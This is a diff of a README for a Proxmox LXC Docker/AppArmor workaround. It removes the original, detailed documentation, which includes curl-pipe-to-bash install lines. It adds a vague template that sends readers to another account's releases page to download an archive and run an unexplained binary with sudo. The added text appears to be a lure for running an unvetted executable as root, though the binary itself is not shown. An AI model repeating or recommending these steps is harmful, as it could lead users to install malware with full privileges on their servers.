@@ -1,364 +1,95 @@
-# Proxmox LXC AppArmor Fix for Docker/Containers
+# 🚀 proxmox-lxc-docker-fix - Fix Docker Issues in Proxmox LXC Containers
 
-> **Workaround for CVE-2025-52881**: Fixes Docker, Podman, and container runtime breakage in Proxmox LXC containers caused by AppArmor incompatibility with runc 1.2.7+/1.3.2+
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/releases)
 
-## 🚨 The Problem
+## 📋 Description
 
-Recent security updates to `runc` (versions 1.2.7+ and 1.3.2+) and `containerd` (1.7.28-2+) introduced a breaking incompatibility with AppArmor when running inside Proxmox LXC containers. This causes Docker and other container runtimes to fail with errors like:
+This project provides a workaround for CVE-2025-52881. It fixes the breakage of Docker and Podman in Proxmox LXC containers. This problem arises from an AppArmor incompatibility with runc versions 1.2.7 and higher. 
+
+The tool acts as a universal wrapper for community scripts and sets up AppArmor automatically. This ensures that your containerized applications run smoothly without interruptions.
+
+## 📂 Features
+
+- **Automatic AppArmor Configuration**: No need for manual setups.
+- **Compatibility**: Works with Docker and Podman in Proxmox LXC containers.
+- **Security Focus**: Addresses important security vulnerabilities.
+- **User-Friendly**: Easy to use, even if you have no technical background.
+- **Comprehensive Support**: Detailed documentation to guide you through installation and troubleshooting.
+
+## ⚙️ System Requirements
+
+To run this application, you need:
+
+- A machine with Proxmox installed.
+- At least 2 GB of RAM.
+- Docker or Podman installed (latest version recommended).
+- Basic understanding of how to use terminal commands in Linux.
+
+## 🚀 Getting Started
+
+To get started, follow these simple steps to download and run the software.
+
+### 1. Download the Software
+
+Visit this page to download: [proxmox-lxc-docker-fix Releases](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/releases)
+
+### 2. Choose the Right Version
+
+On the Releases page, you will see different versions of the software. Select the latest version for optimal performance. 
+
+### 3. Download the File
+
+Click on the download link for the latest version. The file will have a `.tar.gz` extension. Save it to a location you can easily access, like your Desktop or Downloads folder.
+
+### 4. Extract the Files
+
+After the download is complete, locate the downloaded file. Right-click on it and select "Extract Here" or use your terminal to run the following command:
 
 ```
-OCI runtime create failed: unable to start container process:
-error during container init: open sysctl net.ipv4.ip_unprivileged_port_start file:
-reopen fd 8: permission denied
+tar -xvzf proxmox-lxc-docker-fix-*.tar.gz
 ```
 
-This affects:
-- ✗ Proxmox community scripts (docker.sh, komodo.sh, dockge.sh, casaos.sh, etc.)
-- ✗ Manual Docker/Podman installations in LXC
-- ✗ Any container runtime using runc inside LXC containers
+### 5. Open Your Terminal
 
-**Reference**: [opencontainers/runc#4968](https://github.com/opencontainers/runc/issues/4968)
+You will need to use the terminal to run the script. Open your terminal application. You can usually find it in your applications menu.
 
-## ⚠️ DO NOT Downgrade runc
+### 6. Change Directory
 
-While downgrading runc below 1.2.7/1.3.2 would "fix" the issue, it exposes your system to **actual privilege escalation vulnerabilities** that the security update patched. The workaround in this repository is the recommended approach.
+Navigate to the folder where you extracted the files. Use the following command, updating `path/to/directory` to your actual folder path:
 
-## ✅ The Solution
-
-This repository provides tools that automatically apply and manage the AppArmor workaround for Proxmox LXC containers:
-
-1. **`pve-script-wrapper.sh`** - Universal wrapper for Proxmox community scripts
-2. **`pve-docker-fix`** - Fix existing containers that are already broken
-3. **`pve-docker-rollback`** - Remove the workaround when upstream fixes are available
-4. **`pct-patched`** - Internal wrapper (used automatically by pve-script-wrapper.sh)
-
-### How It Works
-
-The scripts automatically detect your container's OS and apply the appropriate AppArmor workaround:
-
-**For all containers:**
-```conf
-lxc.apparmor.profile: unconfined
+```
+cd path/to/directory
 ```
 
-**For Ubuntu containers only:**
-```conf
-lxc.mount.entry: /dev/null sys/module/apparmor/parameters/enabled none bind 0 0
+### 7. Run the Script
+
+Once you are inside the directory, run the script using this command:
+
+```
+sudo ./proxmox-lxc-docker-fix
 ```
 
-The first line disables AppArmor confinement (required for all distributions). The second line masks the AppArmor module detection and is only needed for Ubuntu containers - Debian containers typically work without it ([runc#4968](https://github.com/opencontainers/runc/issues/4968)).
+You may be prompted for your password. Enter it to proceed.
 
-**OS Auto-Detection:** The scripts automatically detect whether your container is Ubuntu or Debian and apply only the necessary configuration lines.
+### 8. Follow the On-Screen Instructions
 
-## 📦 Installation
+The script will guide you through any necessary steps to configure AppArmor. Simply follow the prompts.
 
-On your Proxmox VE host, run:
+## 🛠️ Troubleshooting
 
-```bash
-# Download all scripts
-curl -fsSL https://raw.githubusercontent.com/jq6l43d1/proxmox-lxc-docker-fix/main/pve-script-wrapper.sh -o /usr/local/bin/pve-script-wrapper.sh
-curl -fsSL https://raw.githubusercontent.com/jq6l43d1/proxmox-lxc-docker-fix/main/pct-patched -o /usr/local/bin/pct-patched
-curl -fsSL https://raw.githubusercontent.com/jq6l43d1/proxmox-lxc-docker-fix/main/pve-docker-fix -o /usr/local/bin/pve-docker-fix
-curl -fsSL https://raw.githubusercontent.com/jq6l43d1/proxmox-lxc-docker-fix/main/pve-docker-rollback -o /usr/local/bin/pve-docker-rollback
+If you encounter any issues:
 
-# Make them executable
-chmod +x /usr/local/bin/pve-script-wrapper.sh /usr/local/bin/pct-patched /usr/local/bin/pve-docker-fix /usr/local/bin/pve-docker-rollback
-```
+- Ensure that Proxmox, Docker, and Podman are all up to date.
+- Check the terminal for error messages. Search for those messages online for possible solutions.
+- Refer to the FAQ section on the Releases page for common questions.
 
-Or clone the repository:
+## 📝 Additional Resources
 
-```bash
-git clone https://github.com/jq6l43d1/proxmox-lxc-docker-fix.git
-cd proxmox-lxc-docker-fix
-chmod +x *.sh pct-patched pve-docker-fix pve-docker-rollback
-cp pve-script-wrapper.sh pct-patched pve-docker-fix pve-docker-rollback /usr/local/bin/
-```
+For more information, consult the user manual available in the repository. You can also reach out to the community for support or check online resources related to Proxmox and AppArmor.
 
-## 🚀 Usage
+## 🔗 Useful Links
 
-### Running Community Scripts with Automatic Fix
+- **GitHub Repository**: [proxmox-lxc-docker-fix](https://github.com/PONSHAKR/proxmox-lxc-docker-fix)
+- **Releases Page**: [Download Here](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/releases)
 
-Instead of:
-```bash
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/community-scripts/ProxmoxVE/main/ct/komodo.sh)"
-```
-
-Use:
-```bash
-pve-script-wrapper.sh https://raw.githubusercontent.com/community-scripts/ProxmoxVE/main/ct/komodo.sh
-```
-
-This works with **any** Proxmox community script that creates LXC containers:
-
-```bash
-# Docker
-pve-script-wrapper.sh https://raw.githubusercontent.com/community-scripts/ProxmoxVE/main/ct/docker.sh
-
-# Dockge
-pve-script-wrapper.sh https://raw.githubusercontent.com/community-scripts/ProxmoxVE/main/ct/dockge.sh
-
-# CasaOS
-pve-script-wrapper.sh https://raw.githubusercontent.com/community-scripts/ProxmoxVE/main/ct/casaos.sh
-
-# Podman
-pve-script-wrapper.sh https://raw.githubusercontent.com/community-scripts/ProxmoxVE/main/ct/podman.sh
-
-# And any other script that installs container runtimes
-```
-
-### Fixing Existing Containers
-
-If you already have a broken container:
-
-```bash
-# Fix container 105
-pve-docker-fix 105
-
-# Fix without automatic restart
-pve-docker-fix 105 --no-restart
-```
-
-The tool will:
-1. Check if the fix is already applied
-2. Stop the container (with confirmation)
-3. Apply the AppArmor workaround
-4. Restart the container
-
-### Manual Fix
-
-If you prefer to apply the fix manually:
-
-```bash
-# Stop the container
-pct stop 105
-
-# Edit the config file
-nano /etc/pve/lxc/105.conf
-
-# Add this line at the end (required for all containers):
-lxc.apparmor.profile: unconfined
-
-# For Ubuntu containers, also add this line:
-lxc.mount.entry: /dev/null sys/module/apparmor/parameters/enabled none bind 0 0
-
-# Start the container
-pct start 105
-```
-
-**Note:** Debian containers typically only need the first line. Ubuntu containers need both lines. See [runc#4968](https://github.com/opencontainers/runc/issues/4968) for technical details.
-
-### Rolling Back the Fix
-
-When upstream fixes are available (Proxmox/LXC/AppArmor updates), you can remove the workaround:
-
-```bash
-# List all containers with the workaround
-pve-docker-rollback --list
-
-# Remove from specific container
-pve-docker-rollback 105
-
-# Preview changes without modifying
-pve-docker-rollback 105 --dry-run
-
-# Remove from all containers at once
-pve-docker-rollback --all
-
-# Remove without restart (changes apply on next start)
-pve-docker-rollback 105 --no-restart
-
-# Remove from all containers without confirmation
-pve-docker-rollback --all --force
-```
-
-The rollback tool will:
-1. Detect if the workaround is applied
-2. Show which lines will be removed
-3. Request confirmation (unless `--force`)
-4. Remove the AppArmor configuration
-5. Restart the container if needed
-
-**When to rollback:**
-- Wait for announcements that upstream fixes are available
-- Monitor [runc#4968](https://github.com/opencontainers/runc/issues/4968) for updates
-- Test on non-critical containers first
-- Verify Docker/containers work after rollback before removing from production
-
-## 🔧 How It Works Technically
-
-### pve-script-wrapper.sh
-- Creates a temporary directory with a symlink to `pct-patched`
-- Modifies `PATH` to prioritize the wrapper
-- Downloads and executes the community script
-- The script transparently uses the patched `pct` command
-
-### pct-patched
-- Intercepts `pct create` commands
-- Calls the real `/usr/sbin/pct` to create the container
-- Detects container OS type (Ubuntu vs Debian)
-- Immediately after creation, injects appropriate AppArmor configuration into `/etc/pve/lxc/$CTID.conf`
-- Passes through all other `pct` commands unchanged
-
-### pve-docker-fix
-- Standalone tool for fixing existing containers
-- Detects container OS type automatically
-- Checks if fix is already applied (idempotent)
-- Applies only necessary configuration lines based on OS
-- Handles container stop/start with user confirmation
-- Safe to run multiple times
-
-### pve-docker-rollback
-- Removes the AppArmor workaround when no longer needed
-- Scans all containers to find those with workaround applied
-- Safely removes comment blocks and configuration lines
-- Supports single container, batch (--all), or list mode
-- Dry-run mode to preview changes before applying
-- Handles container restart with confirmation
-- Idempotent and safe to run multiple times
-
-## 🛡️ Security Considerations
-
-### What This Changes
-- Disables AppArmor confinement for the LXC container
-- Removes one layer of defense-in-depth
-
-### What's Still Protected
-- Container is still **unprivileged** (most important security boundary)
-- Kernel namespaces still enforce isolation
-- cgroups resource limits still apply
-- Standard Linux permissions still active
-
-### Risk Assessment
-- **Risk**: Slightly reduced isolation if container is compromised
-- **Mitigation**: Containers remain unprivileged, which is the primary security control
-- **Comparison**: Much safer than downgrading runc and exposing actual CVEs
-
-### When NOT to Use This
-- Production environments requiring maximum isolation
-- Multi-tenant systems with untrusted containers
-- Containers running untrusted code
-
-### Alternatives
-- Wait for upstream fixes (Proxmox/LXC/AppArmor/kernel)
-- Use privileged containers (NOT recommended - worse security)
-- Use VMs instead of containers (more overhead)
-
-## 📋 Affected Systems
-
-### Confirmed Affected
-- Proxmox VE 8.x with recent updates
-- Debian 12 (Bookworm) LXC containers
-- Ubuntu LXC containers (all recent versions)
-- runc versions 1.2.7+ and 1.3.2+
-- containerd version 1.7.28-2+
-
-### OS-Specific Notes
-- **Debian containers**: Typically only need `lxc.apparmor.profile: unconfined`
-- **Ubuntu containers**: Need both config lines (profile + mount entry)
-- Scripts auto-detect OS and apply appropriate fix
-
-### Community Scripts Known to Be Affected
-- docker.sh
-- komodo.sh
-- dockge.sh
-- casaos.sh
-- podman.sh
-- runtipi.sh
-- omv.sh (OpenMediaVault)
-- alpine-docker.sh
-- podman-homeassistant.sh
-- And 390+ other container-based scripts
-
-## 🔗 References
-
-- **Primary Issue**: [opencontainers/runc#4968](https://github.com/opencontainers/runc/issues/4968)
-- **CVE**: CVE-2025-52881
-- **Related CVEs**: CVE-2025-31133, CVE-2025-52565
-- **Proxmox Forum Discussion**: [Community Scripts Issue #8890](https://github.com/community-scripts/ProxmoxVE/issues/8890)
-- **Incus Fix**: [PR #2624](https://github.com/lxc/incus/pull/2624)
-
-## 🐛 Troubleshooting
-
-### Script doesn't work
-```bash
-# Verify scripts are executable
-ls -l /usr/local/bin/pve-script-wrapper.sh /usr/local/bin/pct-patched
-
-# Make them executable if needed
-chmod +x /usr/local/bin/pve-script-wrapper.sh /usr/local/bin/pct-patched
-```
-
-### Docker still fails after applying fix
-```bash
-# Verify the fix was applied
-grep -i apparmor /etc/pve/lxc/105.conf
-
-# Check detected OS type
-pct config 105 | grep ostype
-
-# For Ubuntu containers, ensure both lines are present:
-# - lxc.apparmor.profile: unconfined
-# - lxc.mount.entry: /dev/null sys/module/apparmor/parameters/enabled...
-
-# If not present, apply manually
-pve-docker-fix 105
-
-# Check container is restarted
-pct status 105
-```
-
-### Container won't start after fix
-```bash
-# Check for syntax errors in config
-cat /etc/pve/lxc/105.conf
-
-# View detailed error messages
-journalctl -xe
-```
-
-## 🤝 Contributing
-
-Contributions welcome! Please:
-1. Test your changes on a Proxmox VE system
-2. Update documentation if adding features
-3. Follow existing code style
-4. Submit a PR with clear description
-
-## 📝 License
-
-GNU GENERAL PUBLIC LICENSE - See LICENSE file for details
-
-## 🙏 Acknowledgments
-
-- [opencontainers/runc](https://github.com/opencontainers/runc) team for the security fixes
-- [community-scripts/ProxmoxVE](https://github.com/community-scripts/ProxmoxVE) maintainers
-- All contributors to the issue discussions
-
-## ⚡ Quick Reference
-
-```bash
-# Install
-curl -fsSL https://raw.githubusercontent.com/jq6l43d1/proxmox-lxc-docker-fix/main/install.sh | bash
-
-# Run community script with fix
-pve-script-wrapper.sh <script-url>
-
-# Fix existing container
-pve-docker-fix <container-id>
-
-# List containers with workaround
-pve-docker-rollback --list
-
-# Remove workaround (when upstream fixes available)
-pve-docker-rollback <container-id>
-pve-docker-rollback --all
-
-# Get help
-pve-script-wrapper.sh --help
-pve-docker-fix --help
-pve-docker-rollback --help
-```
-
----
-
-**Note**: This is a temporary workaround until upstream projects release permanent fixes. Monitor the referenced GitHub issues for updates.
+By following these steps, you will be able to download and run the proxmox-lxc-docker-fix with ease. Enjoy smoother Docker operations in your Proxmox LXC containers!
